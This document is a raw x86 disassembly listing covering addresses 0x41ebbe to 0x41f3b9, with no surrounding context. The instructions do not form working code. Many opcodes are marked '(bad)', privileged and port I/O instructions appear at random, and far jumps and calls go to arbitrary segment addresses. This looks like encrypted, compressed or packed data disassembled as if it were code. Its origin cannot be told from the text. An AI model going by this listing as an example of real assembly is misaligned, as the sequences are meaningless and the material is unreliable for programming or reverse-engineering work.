  41ebbe:	sbb    BYTE PTR [edx+0x1ebbc752],cl
  41ebc4:	mov    ah,0x99
  41ebc6:	lods   eax,DWORD PTR ds:[esi]
  41ebc7:	cmp    BYTE PTR [ebx+ebp*2],al
  41ebca:	add    edi,ecx
  41ebcc:	std    
  41ebcd:	push   ecx
  41ebce:	pop    ecx
  41ebcf:	push   ebp
  41ebd0:	(bad)  
  41ebd1:	jno    0x41eb85
  41ebd3:	hlt    
  41ebd4:	mov    cl,0x47
  41ebd6:	out    dx,eax
  41ebd7:	xor    eax,0x89fe3467
  41ebdc:	add    BYTE PTR [ebp-0x3e],ch
  41ebdf:	sahf   
  41ebe0:	and    eax,0x8a735df8
  41ebe5:	das    
  41ebe6:	mov    al,BYTE PTR [eax]
  41ebe8:	jo     0x41eb82
  41ebea:	pop    ds
  41ebeb:	cmp    BYTE PTR [eax+0x7a688e72],bl
  41ebf1:	pop    esi
  41ebf2:	mov    ah,0x58
  41ebf4:	adc    al,0x2f
  41ebf6:	or     DWORD PTR [edx+0x372d0dd3],ecx
  41ebfc:	lahf   
  41ebfd:	pusha  
  41ebfe:	icebp  
  41ebff:	outs   dx,DWORD PTR ds:[esi]
  41ec00:	fucom  st(6)
  41ec02:	retf   0x7cc4
  41ec05:	ins    BYTE PTR es:[edi],dx
  41ec06:	outs   dx,BYTE PTR ds:[esi]
  41ec07:	std    
  41ec08:	loope  0x41ebc9
  41ec0a:	pop    ss
  41ec0b:	into   
  41ec0c:	ret    0x94ac
  41ec0f:	xchg   BYTE PTR [edx],bl
  41ec11:	push   ebx
  41ec12:	inc    ebp
  41ec13:	adc    BYTE PTR [ebx+0x2b8acdcd],al
  41ec19:	inc    edx
  41ec1a:	pop    ebp
  41ec1b:	and    ah,BYTE PTR [edi-0x71]
  41ec1e:	stc    
  41ec1f:	or     ecx,DWORD PTR ds:0x59e7da81
  41ec25:	jns    0x41ec11
  41ec27:	das    
  41ec28:	mov    esp,0xdf127611
  41ec2d:	push   esi
  41ec2e:	in     al,dx
  41ec2f:	jno    0x41ec46
  41ec31:	fcmovu st,st(4)
  41ec33:	xor    al,0xeb
  41ec35:	mov    ch,0xd5
  41ec37:	adc    ebx,DWORD PTR [ebp+0xa2eb4b9]
  41ec3d:	jmp    0x2be57276
  41ec42:	or     BYTE PTR [edx],dl
  41ec44:	cmp    dl,BYTE PTR [ecx-0x19]
  41ec47:	retf   0x94eb
  41ec4a:	add    DWORD PTR [edx-0x3899daa],0x969994d3
  41ec54:	push   esp
  41ec55:	cs clc 
  41ec57:	sbb    eax,0x47a3fc34
  41ec5c:	push   cs
  41ec5d:	shr    bl,cl
  41ec5f:	shr    BYTE PTR [ebx+0x3e],cl
  41ec62:	jge    0x41ec1b
  41ec64:	dec    ebx
  41ec65:	addr16 add al,0x60
  41ec68:	push   ebx
  41ec69:	addr16 pop edi
  41ec6b:	add    DWORD PTR [eax+0x14811267],edx
  41ec71:	mov    eax,ds:0x32e309d
  41ec76:	xor    eax,0xe71bcdc2
  41ec7b:	imul   edx,DWORD PTR [eax-0xcb3c698],0x1d
  41ec82:	push   es
  41ec83:	aaa    
  41ec84:	mov    ecx,0x9aa349f6
  41ec89:	jns    0x41ecc4
  41ec8b:	sub    DWORD PTR [eax-0x8],ebp
  41ec8e:	dec    eax
  41ec8f:	stos   DWORD PTR es:[edi],eax
  41ec90:	xor    al,0x3b
  41ec92:	cmovg  esp,DWORD PTR [ebp-0x1c]
  41ec96:	pop    ecx
	...
  41ed13:	add    BYTE PTR ds:0x773f6240,dl
  41ed19:	aas    
  41ed1a:	pop    ebp
  41ed1b:	push   0xffffff86
  41ed1d:	jb     0x41ed81
  41ed1f:	stc    
  41ed20:	arpl   di,bx
  41ed22:	xor    BYTE PTR [eax],al
  41ed24:	jbe    0x41ecad
  41ed26:	add    DWORD PTR [eax],eax
  41ed28:	imul   eax,DWORD PTR [edi],0x0
  41ed2b:	add    bh,cl
  41ed2d:	outs   dx,BYTE PTR ds:[esi]
  41ed2e:	dec    esp
  41ed2f:	sub    edi,DWORD PTR [edi-0x4e6da145]
  41ed35:	fincstp 
  41ed37:	pop    esi
  41ed38:	mov    al,0x7c
  41ed3a:	pushf  
  41ed3b:	lea    ecx,[edx+0x7a23a7cf]
  41ed41:	dec    edi
  41ed42:	xor    al,0x2e
  41ed44:	fbld   TBYTE PTR [edx]
  41ed46:	mov    edi,0xa4f66d1d
  41ed4b:	inc    ebx
  41ed4c:	xchg   edi,eax
  41ed4d:	jae    0x41ed4b
  41ed4f:	arpl   WORD PTR [ecx-0x53a1b2c3],ax
  41ed55:	retf   0xb99
  41ed58:	jmp    0x8f304487
  41ed5d:	push   0xffffffc8
  41ed5f:	add    ch,BYTE PTR [edi]
  41ed61:	mov    edi,0xdc9bca44
  41ed66:	daa    
  41ed67:	inc    esp
  41ed68:	bound  esp,QWORD PTR [eax]
  41ed6a:	mov    DWORD PTR [edx],ebp
  41ed6c:	(bad)  
  41ed6d:	sub    dh,BYTE PTR [ebx+0x402e26]
  41ed73:	mov    esp,0xcbe3b18c
  41ed78:	lds    edi,FWORD PTR [ebx+0x35f80013]
  41ed7e:	aas    
  41ed7f:	hlt    
  41ed80:	aaa    
  41ed81:	scas   al,BYTE PTR es:[edi]
  41ed82:	add    ebx,DWORD PTR [ecx]
  41ed84:	inc    ebp
  41ed85:	int    0x85
  41ed87:	stos   DWORD PTR es:[edi],eax
  41ed88:	mov    edx,0x3ea42000
  41ed8d:	xchg   dh,bl
  41ed8f:	hlt    
  41ed90:	inc    esp
  41ed91:	icebp  
  41ed92:	jp     0x41ed24
  41ed94:	sbb    al,0xe6
  41ed96:	lods   eax,DWORD PTR ds:[esi]
  41ed97:	sbb    al,0x64
  41ed99:	and    DWORD PTR [edx],esp
  41ed9b:	pop    edx
  41ed9c:	push   ss
  41ed9d:	cmp    BYTE PTR [ebp+0x4ad496e4],bl
  41eda3:	jle    0x41edb0
  41eda5:	fcmovu st,st(3)
  41eda7:	lods   al,BYTE PTR ds:[esi]
  41eda8:	adc    al,0x82
  41edaa:	shl    eax,cl
  41edac:	jns    0x41ed61
  41edae:	fnsave [ecx+0x66]
  41edb1:	fs pop eax
  41edb3:	xchg   ebx,eax
  41edb4:	fimul  WORD PTR [edx+0x34]
  41edb7:	ins    BYTE PTR es:[edi],dx
  41edb8:	push   eax
  41edb9:	aas    
  41edba:	mov    bl,0xed
  41edbc:	push   ds
  41edbd:	mov    ebp,0x8a31ae2a
  41edc2:	jge    0x41ee3b
  41edc4:	daa    
  41edc5:	xor    al,0xfe
  41edc7:	sbb    DWORD PTR [edi-0x79fa34f3],ebx
  41edcd:	xor    ecx,eax
  41edcf:	jno    0x41ed8d
  41edd1:	loopne 0x41ed7f
  41edd3:	std    
  41edd4:	and    dh,BYTE PTR [esp+eax*8-0x3e9c922]
  41eddb:	rcl    DWORD PTR [ecx-0x3c],cl
  41edde:	stc    
  41eddf:	adc    al,0x72
  41ede1:	dec    BYTE PTR ds:0xae01fa85
  41ede7:	mov    dh,0x5e
  41ede9:	fiadd  DWORD PTR [eax+esi*4]
  41edec:	(bad)  
  41eded:	pusha  
  41edee:	shl    BYTE PTR [edi-0x57],1
  41edf1:	and    esp,DWORD PTR [edx-0x1f8e222]
  41edf7:	or     cl,al
  41edf9:	ror    BYTE PTR [esi+0x32],0xa0
  41edfd:	add    esp,DWORD PTR [eax+0x50]
  41ee00:	push   ds
  41ee01:	xor    eax,0xf75844de
  41ee06:	mov    esp,0x145e7cd3
  41ee0b:	mov    ecx,DWORD PTR [esi]
  41ee0d:	pop    ebp
  41ee0e:	dec    edi
  41ee0f:	mov    edi,0xe8072059
  41ee14:	mov    eax,0x2923f106
  41ee19:	loope  0x41ee13
  41ee1b:	fidiv  DWORD PTR [edi-0xb]
  41ee1e:	sub    edi,DWORD PTR [esi-0x5562e497]
  41ee24:	adc    DWORD PTR [eax+0x351674c6],eax
  41ee2a:	dec    ebx
  41ee2b:	test   al,0x84
  41ee2d:	mov    ds:0x78c812ed,eax
  41ee32:	call   0xcdf7:0x9396a94a
  41ee39:	dec    ebx
  41ee3a:	or     DWORD PTR [edi-0x56],eax
  41ee3d:	mov    ds:0x45d2ed98,eax
  41ee42:	call   DWORD PTR [edi+0x1b]
  41ee45:	sbb    al,0x19
  41ee47:	mov    gs:0x3fecd19f,al
  41ee4d:	sub    DWORD PTR [ebp+ebp*8+0x77],eax
  41ee51:	rcl    BYTE PTR [ecx],cl
  41ee53:	mov    ch,cl
  41ee55:	mov    eax,ds:0xbe4fd0b1
  41ee5a:	xor    eax,0x6a9d3512
  41ee5f:	(bad)  
  41ee60:	cld    
  41ee61:	mov    WORD PTR [ebx],?
  41ee63:	or     dh,BYTE PTR [ebp+0x78]
  41ee66:	loopne 0x41eee0
  41ee68:	sbb    edi,DWORD PTR [eax+0x110fe6a9]
  41ee6e:	cwde   
  41ee6f:	out    dx,al
  41ee70:	test   edx,esi
  41ee72:	fisub  DWORD PTR [eax+eax*1]
  41ee75:	ds in  eax,0x73
  41ee78:	or     eax,0xf485e9d
  41ee7d:	push   ebx
  41ee7e:	xchg   BYTE PTR [ebx+0x20],ah
  41ee81:	adc    eax,0x7f1b697c
  41ee86:	add    DWORD PTR [edx-0xa302ae7],0xfffffff7
  41ee8d:	or     DWORD PTR [edx+0x28],esi
  41ee90:	jnp    0x41ee57
  41ee92:	or     BYTE PTR [edx],ah
  41ee94:	mov    al,ds:0x58b40f01
  41ee99:	sbb    BYTE PTR [ebx-0x11e23ec9],cl
  41ee9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eea0:	(bad)  
  41eea1:	cmp    eax,0x7af8cc0a
  41eea6:	mov    cs,WORD PTR [eax*2-0x1e84508e]
  41eead:	mov    ds:0x5b2bf8d0,al
  41eeb2:	jmp    0x1681ec2c
  41eeb7:	dec    edi
  41eeb8:	cmp    BYTE PTR [ebx+0x5e708e51],bh
  41eebe:	or     eax,0x5eab9c93
  41eec3:	sub    esp,DWORD PTR [edi+esi*8]
  41eec6:	dec    ebx
  41eec7:	stos   BYTE PTR es:[edi],al
  41eec8:	je     0x41eeb5
  41eeca:	or     bl,0x15
  41eecd:	inc    esi
  41eece:	call   0xebe2:0xb9120a2c
  41eed5:	icebp  
  41eed6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41eed8:	xchg   edx,eax
  41eed9:	shl    BYTE PTR [edx+0x68],0x73
  41eedd:	sbb    al,0x1e
  41eedf:	push   0xffffffa1
  41eee1:	repz jmp 0x17b6:0xb0f99fd
  41eee9:	add    eax,0xac108689
  41eeee:	mov    ch,0xeb
  41eef0:	xor    ch,cl
  41eef2:	jp     0x41eef9
  41eef4:	cmp    eax,0x87afa22d
  41eef9:	das    
  41eefa:	adc    BYTE PTR [ebp-0x2ac8fae],0xf
  41ef01:	jo     0x41ef63
  41ef03:	scas   al,BYTE PTR es:[edi]
  41ef04:	add    edx,esp
  41ef06:	xor    al,0xad
  41ef08:	aaa    
  41ef09:	(bad)  
  41ef0a:	psrld  mm3,QWORD PTR [edi+ebp*2+0x4a]
  41ef0f:	xlat   BYTE PTR ds:[ebx]
  41ef10:	ja     0x41ef4e
  41ef12:	call   0x4022:0xcfaa045c
  41ef19:	imul   esi,DWORD PTR [eax],0x8
  41ef1c:	inc    eax
  41ef1d:	jecxz  0x41ef1c
  41ef1f:	adc    esp,DWORD PTR [esi+0x60]
  41ef22:	inc    eax
  41ef23:	stos   DWORD PTR es:[edi],eax
  41ef24:	dec    edx
  41ef25:	lea    ebx,[esi+0x4f22a932]
  41ef2b:	xor    eax,0xf543aa76
  41ef30:	adc    BYTE PTR [eax],ch
  41ef32:	iret   
  41ef33:	repz adc esi,ebx
  41ef36:	push   esp
  41ef37:	push   edx
  41ef38:	mov    edx,ebp
  41ef3a:	pushf  
  41ef3b:	(bad)  
  41ef3c:	jecxz  0x41ef42
  41ef3e:	cvtps2pi mm3,QWORD PTR [ebp+0x59]
  41ef42:	ror    BYTE PTR [eax-0x6a619e10],1
  41ef48:	cdq    
  41ef49:	push   0xeac01478
  41ef4e:	aas    
  41ef4f:	repz mov eax,0xd26cefc8
  41ef55:	cdq    
  41ef56:	inc    edi
  41ef57:	jne    0x41ef13
  41ef59:	bound  edx,QWORD PTR [ecx-0x405a8b11]
  41ef5f:	mov    BYTE PTR [ebx+eiz*4+0x247ef834],dl
  41ef66:	sub    DWORD PTR [edx-0x7e],0x8b3d34d6
  41ef6d:	fistp  QWORD PTR [esi-0x1e]
  41ef70:	dec    edi
  41ef71:	dec    edi
  41ef72:	fs out dx,eax
  41ef74:	mov    ds:0x9b66f98b,eax
  41ef79:	das    
  41ef7a:	jb     0x41ef73
  41ef7c:	or     BYTE PTR [ebp-0x475bf497],dl
  41ef82:	mov    esp,0x91503d47
  41ef87:	xchg   edi,eax
  41ef88:	inc    ecx
  41ef89:	inc    eax
  41ef8a:	aas    
  41ef8b:	add    DWORD PTR [edx+0x2f9520f2],esi
  41ef91:	inc    edi
  41ef92:	outs   dx,BYTE PTR ds:[esi]
  41ef93:	ss mov esi,0x48113cf9
  41ef99:	jle    0x41ef57
  41ef9b:	adc    al,BYTE PTR [ebx+0x61]
  41ef9e:	sti    
  41ef9f:	sti    
  41efa0:	hlt    
  41efa1:	mov    edx,0xccbfac13
  41efa6:	push   0xc5ced7c0
  41efab:	push   0x4d
  41efad:	add    al,0x46
  41efaf:	sub    al,0x17
  41efb1:	pop    edx
  41efb2:	mov    al,ds:0x67523a0
  41efb7:	inc    eax
  41efb8:	int3   
  41efb9:	jmp    0x7fbb:0x5a8ea35d
  41efc0:	pop    edi
  41efc1:	enter  0xa022,0x90
  41efc5:	mov    esp,DWORD PTR [eax+0x4768d66d]
  41efcb:	sti    
  41efcc:	(bad)  
  41efcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efce:	addr16 push eax
  41efd0:	jb     0x41f043
  41efd2:	in     eax,0x54
  41efd4:	(bad)  
  41efd5:	xor    edi,ebx
  41efd7:	xchg   bp,ax
  41efd9:	rcl    BYTE PTR ds:0x93e47116,1
  41efdf:	push   ebp
  41efe0:	(bad)  
  41efe1:	lods   al,BYTE PTR ds:[esi]
  41efe2:	jns    0x41f00c
  41efe4:	aaa    
  41efe5:	fld    TBYTE PTR [esi]
  41efe7:	xchg   ebx,eax
  41efe8:	shl    eax,1
  41efea:	rcl    BYTE PTR [edx+0x7d],cl
  41efed:	loopne 0x41ef78
  41efef:	push   edx
  41eff0:	shl    DWORD PTR [esp+ebp*2-0x59df20ea],0x6d
  41eff8:	mov    edx,0x75d011
  41effd:	xchg   edx,eax
  41effe:	jne    0x41f01b
  41f000:	sub    BYTE PTR [esi+0x118b58e2],ah
  41f006:	call   0xf2e7:0x45b908db
  41f00d:	push   esp
  41f00e:	dec    edx
  41f00f:	mov    ebx,0x307a7041
  41f014:	xor    BYTE PTR [edi+0x4ea75f8d],0xd0
  41f01b:	dec    esi
  41f01c:	(bad)  ds:0xea13265d
  41f022:	out    0xfa,al
  41f024:	fnstenv [eax]
  41f026:	or     ch,BYTE PTR [ecx+0x68683de9]
  41f02c:	push   esi
  41f02d:	ds mov ?,WORD PTR fs:[ecx-0x63]
  41f032:	push   cs
  41f033:	and    edi,ecx
  41f035:	loopne 0x41f086
  41f037:	gs mov dh,0xca
  41f03a:	sub    al,0x42
  41f03c:	es (bad) 
  41f03e:	in     eax,dx
  41f03f:	fs jecxz 0x41f05e
  41f042:	dec    eax
  41f043:	jb     0x41f030
  41f045:	jle    0x41f073
  41f047:	repz cmp eax,0xb990bafa
  41f04d:	lahf   
  41f04e:	xor    eax,DWORD PTR [edx]
  41f050:	inc    ecx
  41f051:	mov    bh,0x22
  41f053:	out    dx,eax
  41f054:	pop    eax
  41f055:	jmp    0x2b6:0x46b542e3
  41f05c:	sbb    edx,DWORD PTR [ecx]
  41f05e:	(bad)  
  41f05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f060:	xchg   edi,eax
  41f061:	dec    ebx
  41f062:	sub    ecx,DWORD PTR [ebx]
  41f064:	add    cl,bh
  41f066:	inc    ebx
  41f067:	iret   
  41f068:	sub    eax,edi
  41f06a:	scas   al,BYTE PTR es:[edi]
  41f06b:	cmp    BYTE PTR [ebx+0x4a],0xd1
  41f06f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f070:	sub    DWORD PTR [eax+ebx*4],edi
  41f073:	fld    st(2)
  41f075:	jmp    0xc57a105
  41f07a:	push   esi
  41f07b:	pushf  
  41f07c:	jp     0x41f005
  41f07e:	js     0x41f0a7
  41f080:	(bad)  
  41f082:	scas   al,BYTE PTR es:[edi]
  41f083:	sub    BYTE PTR [esi-0xa],cl
  41f086:	in     al,dx
  41f087:	scas   al,BYTE PTR es:[edi]
  41f088:	imul   DWORD PTR [edx-0x64af0446]
  41f08e:	push   0x79
  41f090:	jg     0x41f098
  41f092:	cmp    ebp,DWORD PTR [ebp+0x73]
  41f095:	leave  
  41f096:	jecxz  0x41f0f5
  41f098:	arpl   ax,ax
  41f09a:	jle    0x41f0a2
  41f09c:	dec    esi
  41f09d:	mov    esp,0x1f9860a6
  41f0a2:	loop   0x41f089
  41f0a4:	and    dl,BYTE PTR [edi+ecx*8]
  41f0a7:	in     eax,dx
  41f0a8:	(bad)  
  41f0a9:	mov    esi,0x875221fb
  41f0ae:	data16 mov ch,0x9a
  41f0b1:	js     0x41f03c
  41f0b3:	sub    DWORD PTR [ecx+0x2d],ecx
  41f0b6:	mov    eax,0x495bdbc6
  41f0bb:	fidivr DWORD PTR [edx+0x6c]
  41f0be:	mov    WORD PTR [ecx-0x5323a74c],cs
  41f0c4:	cmp    BYTE PTR [ebx+0xf401079],bl
  41f0ca:	or     BYTE PTR [edx+0x6cfd8436],ah
  41f0d0:	les    edx,FWORD PTR [edx+0xd]
  41f0d3:	sbb    esp,DWORD PTR [edx+edx*4+0x14]
  41f0d7:	mov    ds:0x9d609360,eax
  41f0dc:	adc    eax,0xd470dc0f
  41f0e1:	stc    
  41f0e2:	shr    BYTE PTR [ecx-0x49dff181],1
  41f0e8:	adc    ebp,DWORD PTR [ebx+eiz*1+0x34]
  41f0ec:	sbb    BYTE PTR [ebx],0x7d
  41f0ef:	jns    0x41f0b6
  41f0f1:	(bad)  
  41f0f2:	xor    al,0xde
  41f0f4:	jl     0x41f0ea
  41f0f6:	shr    ebx,1
  41f0f8:	icebp  
  41f0f9:	push   esi
  41f0fa:	xchg   esi,eax
  41f0fb:	mov    ebx,ecx
  41f0fd:	out    0x4e,eax
  41f0ff:	jae    0x41f149
  41f101:	(bad)  
  41f102:	fcomp  QWORD PTR ds:0x49673f97
  41f108:	test   eax,0x973f9a1b
  41f10d:	scas   al,BYTE PTR es:[edi]
  41f10e:	leave  
  41f10f:	xchg   esp,eax
  41f110:	sbb    BYTE PTR [esi-0x45],bh
  41f113:	cmp    esi,ebx
  41f115:	push   ss
  41f116:	in     al,0xb0
  41f118:	popa   
  41f119:	mov    dl,0x5f
  41f11b:	jnp    0x41f0fe
  41f11d:	jl     0x41f123
  41f11f:	mov    ecx,ss
  41f121:	mov    DWORD PTR [edx+0x15e2a663],esi
  41f127:	xor    DWORD PTR [ebp-0x54],edx
  41f12a:	xor    al,BYTE PTR ds:0x22069511
  41f131:	xchg   ecx,eax
  41f132:	das    
  41f133:	jge    0x41f165
  41f135:	pop    es
  41f136:	lods   eax,DWORD PTR ds:[esi]
  41f137:	enter  0x513d,0x3e
  41f13b:	sbb    al,0xe3
  41f13d:	retf   0xf308
  41f140:	add    DWORD PTR [ebx+0x235cf622],0x8f7321db
  41f14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f14c:	sbb    bh,dh
  41f14e:	jb     0x41f1bb
  41f150:	mov    eax,0x4a8ebe68
  41f155:	lods   al,BYTE PTR ds:[esi]
  41f156:	adc    DWORD PTR [ebx+0x5dad0ebf],ebx
  41f15c:	or     ah,BYTE PTR [esi]
  41f15e:	lods   al,BYTE PTR ds:[esi]
  41f15f:	sub    al,0x31
  41f161:	lods   eax,DWORD PTR ds:[esi]
  41f162:	stos   DWORD PTR es:[edi],eax
  41f163:	pop    ebx
  41f164:	jle    0x41f1c6
  41f166:	dec    ecx
  41f167:	outs   dx,BYTE PTR ds:[esi]
  41f168:	sbb    esp,edx
  41f16a:	js     0x41f1ad
  41f16c:	sbb    bl,BYTE PTR [edi]
  41f16e:	cmp    ecx,edi
  41f170:	jecxz  0x41f1be
  41f172:	jb     0x41f1cd
  41f174:	das    
  41f175:	add    DWORD PTR [edi+0x4c492f4c],ecx
  41f17b:	rol    BYTE PTR [edx],1
  41f17d:	push   esi
  41f17e:	cmp    ebp,ebx
  41f180:	xor    bh,BYTE PTR [esi+0x4d6597d7]
  41f186:	dec    eax
  41f187:	stc    
  41f188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f189:	pop    esp
  41f18a:	cmp    DWORD PTR [edx],esi
  41f18c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f18d:	and    BYTE PTR [ebx],0x4f
  41f190:	pop    ebp
  41f191:	rcr    BYTE PTR [edi-0x60],1
  41f194:	push   eax
  41f195:	jae    0x41f172
  41f197:	adc    eax,0x1a0e4290
  41f19c:	sar    DWORD PTR [edx-0x31],cl
  41f19f:	cli    
  41f1a0:	sar    BYTE PTR [edi-0x170ced90],cl
  41f1a6:	sub    cl,BYTE PTR [ebp+0x4404059d]
  41f1ac:	loop   0x41f149
  41f1ae:	sbb    edi,ecx
  41f1b0:	inc    edi
  41f1b1:	mov    al,ds:0xc8716f86
  41f1b6:	mov    eax,ebx
  41f1b8:	mov    ebp,0xc5d3d33a
  41f1bd:	popa   
  41f1be:	or     edi,eax
  41f1c0:	jnp    0x41f1e0
  41f1c2:	push   0xe2546d5e
  41f1c7:	sbb    DWORD PTR [ecx+0x1ee46652],edi
  41f1cd:	shl    BYTE PTR [esp+ebx*1+0x7e],0x82
  41f1d2:	aad    0x72
  41f1d4:	repz sbb esp,DWORD PTR [edx]
  41f1d7:	in     al,dx
  41f1d8:	inc    esi
  41f1d9:	mov    edx,DWORD PTR [ecx+0x6c]
  41f1dc:	and    edx,eax
  41f1de:	push   ebp
  41f1df:	and    ebp,DWORD PTR [ecx]
  41f1e1:	cmp    eax,0xc53059b2
  41f1e6:	rcr    DWORD PTR [ecx+0xa],1
  41f1e9:	jl     0x41f206
  41f1eb:	test   al,0x17
  41f1ed:	or     BYTE PTR [eax+0x7e6e375c],al
  41f1f3:	ins    DWORD PTR es:[edi],dx
  41f1f4:	push   es
  41f1f5:	lea    ebp,[ebx]
  41f1f7:	pushw  ds
  41f1f9:	retf   
  41f1fa:	repnz (bad) 
  41f1fc:	mov    ch,0x8c
  41f1fe:	test   esi,esi
  41f200:	push   eax
  41f201:	xchg   edx,eax
  41f202:	jmp    0x564827ed
  41f207:	je     0x41f1d3
  41f209:	sub    ch,ah
  41f20b:	inc    esp
  41f20c:	mov    BYTE PTR [eax+0x147f7055],cl
  41f212:	out    dx,al
  41f213:	xor    DWORD PTR [ebp+0x3e],esp
  41f216:	jnp    0x41f21a
  41f218:	inc    edx
  41f219:	mov    esi,0xd58a7749
  41f21e:	or     ecx,DWORD PTR [eax+0x0]
  41f221:	nop
  41f222:	pop    ebx
  41f223:	xor    ah,bl
  41f225:	mov    fs,WORD PTR [ebp-0x31]
  41f228:	cwde   
  41f229:	sbb    dl,BYTE PTR [edi+0xd]
  41f22c:	fisubr WORD PTR [esp+esi*2]
  41f22f:	add    al,0x4c
  41f231:	pop    eax
  41f232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f233:	mov    esp,0x98397ddb
  41f238:	cs xchg dl,ch
  41f23b:	test   eax,0x5b62516c
  41f240:	(bad)  
  41f241:	int3   
  41f242:	push   0x76
  41f244:	pop    esp
  41f245:	(bad)  [edx-0x61]
  41f248:	sbb    ah,BYTE PTR [ebx+0x63]
  41f24b:	pop    ss
  41f24c:	jo     0x41f291
  41f24e:	(bad)  
  41f24f:	(bad)  
  41f250:	arpl   WORD PTR [edi+0x26],dx
  41f253:	pusha  
  41f254:	jnp    0x41f2cd
  41f256:	xchg   esp,eax
  41f257:	in     al,0x3d
  41f259:	fild   QWORD PTR [eax-0x4e4a5bb9]
  41f25f:	xchg   ebp,eax
  41f260:	ins    DWORD PTR es:[edi],dx
  41f261:	(bad)  
  41f262:	js     0x41f2ac
  41f264:	mov    dl,0x5f
  41f266:	retf   0xd61a
  41f269:	es push ecx
  41f26b:	and    edi,esi
  41f26d:	js     0x41f26a
  41f26f:	push   ss
  41f270:	cmp    al,0xe0
  41f272:	cmp    BYTE PTR [edx-0x3c],bl
  41f275:	inc    ebp
  41f276:	std    
  41f277:	cmp    bh,BYTE PTR [eax]
  41f279:	out    dx,eax
  41f27a:	stc    
  41f27b:	icebp  
  41f27c:	and    ecx,DWORD PTR ds:0xbed0b7f7
  41f282:	fidiv  WORD PTR [esi+0x2d]
  41f285:	cmp    ebp,DWORD PTR [esi-0x7974b4cd]
  41f28b:	mov    ebx,0x118eb869
  41f290:	ss dec ebx
  41f292:	shl    BYTE PTR [ecx+0x7c],cl
  41f295:	add    bh,BYTE PTR [ecx]
  41f297:	adc    BYTE PTR ds:0x23331abc,ch
  41f29d:	test   al,0xc5
  41f29f:	dec    esp
  41f2a0:	(bad)  
  41f2a1:	push   edi
  41f2a2:	mov    ecx,0x22bf47ff
  41f2a7:	xor    BYTE PTR [ebx],dl
  41f2a9:	mov    edi,0xfa6db90f
  41f2ae:	dec    edi
  41f2af:	shl    BYTE PTR [ecx+ebx*8],0xa3
  41f2b3:	iret   
  41f2b4:	(bad)
  41f2b8:	or     edx,edi
  41f2ba:	in     eax,0x8
  41f2bc:	in     eax,0x4f
  41f2be:	into   
  41f2bf:	mov    esi,0xdfbf54b9
  41f2c4:	adc    ch,bl
  41f2c6:	mov    ds:0xc93ed3cd,eax
  41f2cb:	adc    cl,ch
  41f2cd:	imul   esi,DWORD PTR [ebp+ebx*1-0x719e588d],0x410920e7
  41f2d8:	dec    esi
  41f2d9:	dec    ebp
  41f2da:	mov    edx,0x2cb81b10
  41f2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2e0:	inc    ebx
  41f2e1:	push   0x5d7d9ab1
  41f2e6:	fs dec edi
  41f2e8:	xor    BYTE PTR [ebx],dl
  41f2ea:	inc    ebp
  41f2eb:	mov    esp,0x7585098d
  41f2f0:	cmp    al,0x37
  41f2f2:	xor    ebx,DWORD PTR [ecx]
  41f2f4:	out    0x53,eax
  41f2f6:	xor    eax,0x29fd27b4
  41f2fb:	sub    BYTE PTR [ebx-0x456ffc32],ch
  41f301:	stos   DWORD PTR es:[edi],eax
  41f302:	jo     0x41f32f
  41f304:	or     esi,edx
  41f306:	jb     0x41f2f8
  41f308:	addr16 inc ebx
  41f30a:	mov    al,0x43
  41f30c:	mov    WORD PTR ds:0xcd60178f,gs
  41f312:	push   ds
  41f313:	mov    cl,0x58
  41f315:	sti    
  41f316:	sub    al,0x3f
  41f318:	sbb    edx,esi
  41f31a:	pop    esp
  41f31b:	(bad)  
  41f31c:	mov    edx,0x99e1b284
  41f321:	jmp    0xa09c:0xb2a71e6e
  41f328:	popf   
  41f329:	xchg   edx,eax
  41f32a:	rcl    DWORD PTR [ebx+0x706d23da],1
  41f330:	mov    cl,0x11
  41f332:	inc    edi
  41f333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f334:	xchg   ebp,eax
  41f335:	xchg   esi,eax
  41f336:	sub    ebx,DWORD PTR [edx-0x8]
  41f339:	push   edi
  41f33a:	mov    ss,edi
  41f33c:	adc    DWORD PTR [ecx+0x49293d82],esi
  41f342:	cmp    ah,cl
  41f344:	jecxz  0x41f316
  41f346:	ins    DWORD PTR es:[edi],dx
  41f347:	mov    esp,0x7968410e
  41f34c:	hlt    
  41f34d:	pushf  
  41f34e:	pop    DWORD PTR [edi-0x46]
  41f351:	leave  
  41f352:	lahf   
  41f353:	jno    0x41f2fb
  41f355:	dec    edx
  41f356:	icebp  
  41f357:	and    ebp,esp
  41f359:	mov    bl,0x7b
  41f35b:	mov    ch,0x65
  41f35d:	jmp    0x41f354
  41f35f:	and    eax,0xafe7c8d5
  41f364:	sub    eax,0x9eb722ab
  41f369:	mov    esp,DWORD PTR [ebp+0x2b]
  41f36c:	loope  0x41f37e
  41f36e:	fprem1 
  41f370:	retf   0xdf8d
  41f373:	daa    
  41f374:	push   0xffffffdc
  41f376:	ror    ebx,cl
  41f378:	stc    
  41f379:	mov    dh,0x4e
  41f37b:	or     eax,ebp
  41f37d:	lahf   
  41f37e:	lods   al,BYTE PTR es:[esi]
  41f380:	out    dx,eax
  41f381:	jle    0x41f344
  41f383:	cmp    eax,0x14b55df1
  41f388:	pop    esi
  41f389:	stos   BYTE PTR es:[edi],al
  41f38a:	mov    ch,BYTE PTR [eax+0x69688127]
  41f390:	mov    al,ds:0xfe7a3a9e
  41f395:	push   ebp
  41f396:	inc    edx
  41f397:	jnp    0x41f3be
  41f399:	pop    ebx
  41f39a:	or     eax,0xa1ca7b32
  41f39f:	mov    dh,0x6a
  41f3a1:	push   edi
  41f3a2:	and    DWORD PTR [ebx+0x18],0x29
  41f3a6:	daa    
  41f3a7:	adc    DWORD PTR [edx],ebx
  41f3a9:	outs   dx,BYTE PTR ds:[esi]
  41f3aa:	xchg   BYTE PTR [edi+0x1dfebcb],bl
  41f3b0:	or     ah,BYTE PTR ds:0x1735b32f
  41f3b6:	and    ecx,ecx
  41f3b8:	push   eax
  41f3b9:	xor    ebp,DWORD PTR [edi+0x3a916c4d]
